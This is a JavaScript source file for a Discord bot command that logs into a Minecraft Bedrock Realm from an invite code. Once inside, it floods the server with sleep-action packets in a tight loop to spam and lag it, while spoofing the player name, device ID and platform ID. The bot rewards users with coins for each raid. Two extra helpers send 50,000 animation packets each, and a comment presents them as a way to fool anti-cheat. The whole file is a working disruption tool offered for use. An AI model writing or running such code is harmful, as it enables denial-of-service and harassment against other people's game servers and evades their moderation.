const fs = require('fs');
const { SlashCommandBuilder } = require('discord.js');
const bedrock = require('bedrock-protocol');
const { RealmAPI } = require('prismarine-realms');
const { Authflow } = require('prismarine-auth');
const { setTimeout } = require('timers/promises');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { cat1, error, loading, replystart, replyend } = require('../../data/emojie');
const { discordInvite, discordlink, footer } = require('../../data/config');
const { checkAndSaveRealm,saveCoins } = require('../functions/realms.js')
const { skinData } = require('../../data/jenny.json')


module.exports = {
    command: new SlashCommandBuilder()
        .setName('ssbp')
        .setDescription('Spam a Server with Sleep Messsages')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('The Realm Code of the Realm.')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('duration')
                .setDescription('Duration in seconds to stay connected to the Realm.')
                .setRequired(true)
                .setMinValue(5)
                .setMaxValue(120)
            )
        .addStringOption(option =>
            option.setName('namespoof_name')
                .setDescription('The Name you wanna use for Namespoof (Premium only)')
                .setRequired(false)),
    execute: async (interaction) => {
        await interaction.deferReply();

        try {
            const realmCode = interaction.options.getString('realmcode');
            const duration = interaction.options.getInteger('duration');
            const deviceOS = interaction.options.getInteger('device_os');
            const name = interaction.options.getString('namespoof_name') || discordInvite;
            const userId = interaction.user.id;
            const profilesFolder = `./authCache/${userId}`;
            const baseCoins = 20;
            const bonusCoins = Math.floor(duration / 60) * 100;
            const totalCoins = baseCoins + bonusCoins;

            if (!fs.existsSync(profilesFolder)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `${error} Account Not Linked ${error} `,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
                return;
            }

            const userIdentifier = undefined;
            const options = { authTitle: '00000000441cc96b', flow: 'live' };
            const authFlow = new Authflow(userIdentifier, profilesFolder, options);
            const realms = RealmAPI.from(authFlow, 'bedrock');
            const realm = await realms.getRealmFromInvite(realmCode);
            const realmName = realm?.name || 'Unknown';
         
            const embed = {
                title: `${cat1} Connecting to Realm: ${realmName} ${cat1}`,
                description: '',
                footer: { text: 'Attempting connection...' },
            };
            await interaction.editReply({ embeds: [embed] });

            const client = bedrock.createClient({
                profilesFolder,
                offline: false,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceOS: 11,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: generateRandomString(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: name,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                    ...skinData
                },
                skipPing: true,
                realms: {
                    [realmCode.length === 8 ? "realmId" : "realmInvite"]: realmCode.length === 8 ? realmCode : `${realmCode}`,
                },
            });

            client.on('join', async () => {
                checkAndSaveRealm(realmCode, userId)
                saveCoins(userId, totalCoins); 
                try {
                    const disconnectTime = Date.now() + duration * 1000;
                    const updatedEmbed = {
                        title: `${cat1} Connected to: ${realmName} ${cat1}`,
                        description: `${replystart}Successfully joined the Realm as ${name}\n${replystart}Realm Code: ${realmCode}\n${replyend}You will earn **${totalCoins} coins**.`,
                        fields: [
                            { name: 'Leaving in', value: `<t:${Math.floor(disconnectTime / 1000)}:R>`, inline: false },
                        ],
                        footer: { text: footer },
                    };
                    await interaction.editReply({ embeds: [updatedEmbed] });
                    console.log(`Connected to Realm: ${realmName} (${realmCode})`);
                } catch (error) {
                    console.error(`Error Realm: ${error.message}`);
                }
            });

            client.on('start_game', async (packet) => {
                const startTime = Date.now();

                const action_packet = {
                    runtime_entity_id: packet.runtime_entity_id,
                    position: { x: 0, y: 0, z: 0 },
                    result_position: { x: 0, y: 0, z: 0 },
                    face: 0,
                  };

                const sendSleepPackets = () => {
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'start_sleeping' });
                    client.write('player_action', { ...action_packet, action: 'stop_sleeping' });
                  };
            
                  const intervalId = setInterval(sendSleepPackets, 0);
          
                  setTimeout(() => {
                    clearInterval(intervalId);
                    client.disconnect();
                }, duration * 1000);  
            });

            client.on('kick', async (packet) => {
                let reason = packet?.reason || 'Unknown reason';
                await interaction.editReply({
                    embeds: [
                        {
                            title: 'Client Kicked',
                            description: 'Client got kicked from the Realm.',
                            color: 0xffa500,
                            fields: [
                                { name: 'Reason', value: reason },
                            ],
                        },
                    ],
                });
            });

            client.on('error', async (err) => {
                console.error(err);
                await interaction.followUp({
                    embeds: [
                        {
                            title: 'Error Occurred',
                            description: 'An error occurred while connecting to the Realm.',
                            color: 0xff0000,
                            fields: [
                                { name: 'Reason', value: err.message || 'Unknown error' },
                            ],
                        },
                    ],
                });
            });

            await setTimeout(duration * 1000);
            client.disconnect();
        } catch (error) {
            console.error(error);

            const errorEmbed = {
                title: 'Error Occurred',
                description: 'The bot encountered an issue while joining the Realm.',
                color: 0xff0000,
                fields: [
                    { name: 'Reason', value: error.message || 'Unknown error', inline: false },
                ],
                footer: { text: 'Please verify the Realm code and your account credentials.' },
            };

            await interaction.editReply({ embeds: [errorEmbed] });
        }
    },
};

function generateRandomString(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}

function lag(client, packet) {
    for (let i = 0; i < 50000; i++) {  
        client.write("animate", {
            action_id: 4,
            runtime_entity_id: packet.runtime_entity_id
        });
    }
};

function lag2(client, packet) {
    for (let i = 0; i < 50000; i++) {   //  like a spoof to anti cheats :p
        client.write("animate", {
            action_id: 1,
            runtime_entity_id: packet.runtime_entity_id
        });
    }
};
